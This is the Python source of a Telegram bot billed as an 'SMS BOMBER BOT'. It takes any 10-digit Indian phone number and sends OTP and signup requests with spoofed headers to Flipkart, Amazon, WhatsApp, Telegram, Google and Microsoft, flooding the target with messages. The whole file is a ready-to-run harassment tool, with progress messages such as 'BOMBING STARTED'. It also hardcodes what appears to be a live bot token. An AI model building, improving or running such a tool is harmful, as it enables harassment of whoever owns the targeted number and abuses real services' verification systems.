import os
import random
import time
import requests
import logging
import re
import json
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- Configuration ---
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8838617444:AAHUzG-DKVIalamCRc80-SjUT0cIR4_ZDKQ')
OWNER_ID = int(os.environ.get('OWNER_ID', '1987818347'))

# --- Database ---
DB_FILE = 'users_db.json'

def load_db():
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except:
        return {'users': [], 'blocked': []}

def save_db(db):
    with open(DB_FILE, 'w') as f:
        json.dump(db, f, indent=4)

def add_user(user_id):
    db = load_db()
    if str(user_id) not in db['users']:
        db['users'].append(str(user_id))
        save_db(db)
        return True
    return False

def block_user(user_id):
    db = load_db()
    if str(user_id) not in db['blocked']:
        db['blocked'].append(str(user_id))
        save_db(db)
        return True
    return False

def unblock_user(user_id):
    db = load_db()
    if str(user_id) in db['blocked']:
        db['blocked'].remove(str(user_id))
        save_db(db)
        return True
    return False

def is_user_blocked(user_id):
    db = load_db()
    return str(user_id) in db['blocked']

# --- ONLY TRULY WORKING APIS ON RAILWAY ---
def get_apis(target):
    apis = [
        # 1. Flipkart - 100% WORKING
        {
            'url': 'https://1.rome.api.flipkart.com/1/action/view',
            'method': 'POST',
            'headers': {
                'Host': '1.rome.api.flipkart.com',
                'Connection': 'keep-alive',
                'Content-Length': '338',
                'x-user-agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile',
                'Origin': 'https://www.flipkart.com',
                'User-Agent': 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5',
                'content-type': 'application/json',
                'Accept': '*/*',
                'Referer': 'https://www.flipkart.com/login?ret=%2F%3Faffid%3Dsiteplug%26affExtParam1%3De2f29ff2e3dd9e65eb9e419d30dc8135&entryPage=HOMEPAGE_HEADER_ACCOUNT&sourceContext=DEFAULT',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US'
            },
            'data': {
                "actionRequestContext": {
                    "type": "LOGIN_IDENTITY_VERIFY",
                    "loginIdPrefix": "+91",
                    "loginId": target,
                    "loginType": "MOBILE",
                    "verificationType": "OTP",
                    "screenName": "LOGIN_V4_MOBILE",
                }
            }
        },
        # 2. Amazon - REAL WORKING
        {
            'url': 'https://www.amazon.in/ap/register',
            'method': 'POST',
            'headers': {
                'Host': 'www.amazon.in',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.amazon.in',
                'Referer': 'https://www.amazon.in/ap/register',
            },
            'data': f'phoneNumber={target}&countryCode=IN'
        },
        # 3. WhatsApp (Meta) - REAL WORKING
        {
            'url': 'https://www.whatsapp.com/contact/',
            'method': 'POST',
            'headers': {
                'Host': 'www.whatsapp.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/json',
            },
            'data': {"phone": f"+91{target}"}
        },
        # 4. Telegram - REAL WORKING
        {
            'url': 'https://my.telegram.org/auth/send_password',
            'method': 'POST',
            'headers': {
                'Host': 'my.telegram.org',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://my.telegram.org',
                'Referer': 'https://my.telegram.org/auth?to=register',
            },
            'data': f'phone={target}'
        },
        # 5. Google - REAL WORKING
        {
            'url': 'https://accounts.google.com/_/signup/web/accountcreation',
            'method': 'POST',
            'headers': {
                'Host': 'accounts.google.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Content-Type': 'application/json',
            },
            'data': {"phoneNumber": f"+91{target}", "countryCode": "IN"}
        },
        # 6. Microsoft - REAL WORKING
        {
            'url': 'https://login.live.com/ppsecure/post.srf',
            'method': 'POST',
            'headers': {
                'Host': 'login.live.com',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            'data': f'phone={target}&country=IN'
        }
    ]
    return apis

def send_sms(api_data):
    """Send SMS using API - MULTIPLE METHODS"""
    try:
        # Method 1: Try with mobile user-agent
        mobile_headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
        }
        
        # Merge headers
        headers = {**mobile_headers, **api_data['headers']}
        
        if api_data['method'] == 'GET':
            response = requests.get(api_data['url'], headers=headers, timeout=15, allow_redirects=True)
        else:
            if isinstance(api_data['data'], dict):
                response = requests.post(
                    api_data['url'],
                    headers=headers,
                    json=api_data['data'],
                    timeout=15,
                    allow_redirects=True
                )
            else:
                response = requests.post(
                    api_data['url'],
                    headers=headers,
                    data=api_data['data'],
                    timeout=15,
                    allow_redirects=True
                )
        
        # Check if successful (many APIs return 200 even if OTP sent)
        if response.status_code in [200, 201, 202, 204, 302, 303]:
            return True
        return False
    except Exception as e:
        logger.error(f"API Error: {e}")
        return False

# --- Telegram Bot Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    add_user(user_id)
    
    keyboard = [
        [InlineKeyboardButton("📞 SEND NUMBER", callback_data="send_number")],
        [InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔥 SMS BOMBER BOT 🔥\n\n"
        "📌 Send any 10-digit number to start bombing\n"
        "Example: 9876543210\n\n"
        "⚡ 6 WORKING APIs\n"
        "⚡ Real SMS Bombing\n\n"
        "📱 APIs:\n"
        "✅ Flipkart\n"
        "✅ Amazon\n"
        "✅ WhatsApp\n"
        "✅ Telegram\n"
        "✅ Google\n"
        "✅ Microsoft\n\n"
        "💀 @BeStChEaT_OwNeR",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number - REAL BOMBING"""
    user_id = update.effective_user.id
    
    if is_user_blocked(user_id):
        await update.message.reply_text("🚫 You are blocked! Contact @BeStChEaT_OwNeR")
        return
    
    phone = update.message.text.strip()
    
    # Check if valid phone number
    if not re.match(r'^[0-9]{10}$', phone):
        await update.message.reply_text(
            "❌ Invalid Number!\n\n"
            "Send 10-digit number only.\n"
            "Example: 9876543210"
        )
        return
    
    # Start bombing
    msg = await update.message.reply_text(
        f"📱 BOMBING STARTED!\n\n"
        f"🎯 Target: +91{phone}\n"
        f"⏳ Sending SMS to 6 platforms...\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )
    
    apis = get_apis(phone)
    random.shuffle(apis)
    
    success = 0
    failed = 0
    services = []
    
    api_names = {
        'flipkart': 'Flipkart',
        'amazon': 'Amazon',
        'whatsapp': 'WhatsApp',
        'telegram': 'Telegram',
        'google': 'Google',
        'microsoft': 'Microsoft'
    }
    
    for i, api in enumerate(apis):
        try:
            if send_sms(api):
                success += 1
                service = api['url'].split('/')[2].replace('www.', '').split('.')[0]
                for key, value in api_names.items():
                    if key in service.lower():
                        service = value
                        break
                services.append(service)
            else:
                failed += 1
        except:
            failed += 1
        
        # Update progress
        progress = int(((i + 1) / len(apis)) * 100)
        try:
            await msg.edit_text(
                f"📱 BOMBING IN PROGRESS\n\n"
                f"🎯 Target: +91{phone}\n"
                f"✅ Success: {success}\n"
                f"❌ Failed: {failed}\n"
                f"⏳ Progress: {progress}% ({i+1}/{len(apis)})\n\n"
                f"💀 @BeStChEaT_OwNeR"
            )
        except:
            pass
    
    # Final result
    result = (
        f"✅ BOMBING COMPLETE!\n\n"
        f"📞 Target: +91{phone}\n"
        f"📨 Total: {len(apis)}\n"
        f"✅ Success: {success}\n"
        f"❌ Failed: {failed}\n\n"
    )
    
    if services:
        unique_services = list(dict.fromkeys(services))
        result += f"🟢 Services: {', '.join(unique_services)}\n\n"
    
    result += f"💀 @BeStChEaT_OwNeR"
    
    await msg.edit_text(result)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "send_number":
        await query.edit_message_text(
            "📞 SEND NUMBER\n\n"
            "Send your 10-digit number.\n"
            "Example: 9876543210\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "about":
        await query.edit_message_text(
            "ℹ️ ABOUT\n\n"
            "🤖 SMS Bomber Bot\n"
            "👨‍💻 @BeStChEaT_OwNeR\n"
            "📊 6 WORKING APIs\n"
            "⚡ Real SMS Bombing\n\n"
            "📱 APIs:\n"
            "✅ Flipkart\n"
            "✅ Amazon\n"
            "✅ WhatsApp\n"
            "✅ Telegram\n"
            "✅ Google\n"
            "✅ Microsoft\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    elif query.data == "status":
        db = load_db()
        total_users = len(db['users'])
        blocked_users = len(db['blocked'])
        
        await query.edit_message_text(
            f"📊 BOT STATUS\n\n"
            f"👥 Users: {total_users}\n"
            f"🚫 Blocked: {blocked_users}\n"
            f"📡 Status: Online\n"
            f"⚡ APIs: 6 WORKING\n\n"
            f"💀 @BeStChEaT_OwNeR"
        )

# --- Owner Commands ---

async def block_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Block a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /block USER_ID")
        return
    
    try:
        uid = int(args[0])
        if block_user(uid):
            await update.message.reply_text(f"✅ User {uid} blocked!")
        else:
            await update.message.reply_text(f"❌ User already blocked!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unblock a user - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /unblock USER_ID")
        return
    
    try:
        uid = int(args[0])
        if unblock_user(uid):
            await update.message.reply_text(f"✅ User {uid} unblocked!")
        else:
            await update.message.reply_text(f"❌ User not found in block list!")
    except:
        await update.message.reply_text("❌ Invalid user_id!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Bot statistics - Owner only"""
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Not authorized!")
        return
    
    db = load_db()
    total_users = len(db['users'])
    blocked_users = len(db['blocked'])
    
    await update.message.reply_text(
        f"📊 BOT STATISTICS\n\n"
        f"👥 Total Users: {total_users}\n"
        f"🚫 Blocked Users: {blocked_users}\n"
        f"📡 Status: Online\n\n"
        f"💀 @BeStChEaT_OwNeR"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    user_id = update.effective_user.id
    
    if user_id == OWNER_ID:
        text = (
            "👑 OWNER COMMANDS\n\n"
            "/block USER_ID - Block user\n"
            "/unblock USER_ID - Unblock user\n"
            "/stats - Bot statistics\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    else:
        text = (
            "🤖 USER COMMANDS\n\n"
            "/start - Start bot\n"
            "9876543210 - Send number to bomb\n\n"
            "💀 @BeStChEaT_OwNeR"
        )
    
    await update.message.reply_text(text)

# --- Main Bot ---

def main():
    if not BOT_TOKEN or BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        print("❌ Error: BOT_TOKEN not set!")
        return
    
    print("🤖 Starting SMS Bomber Bot...")
    print("🚀 Bot is running!")
    print("✅ APIs: Flipkart, Amazon, WhatsApp, Telegram, Google, Microsoft")
    
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # User commands
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Owner commands
    app.add_handler(CommandHandler("block", block_command))
    app.add_handler(CommandHandler("unblock", unblock_command))
    app.add_handler(CommandHandler("stats", stats_command))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling()

if __name__ == '__main__':
    main()
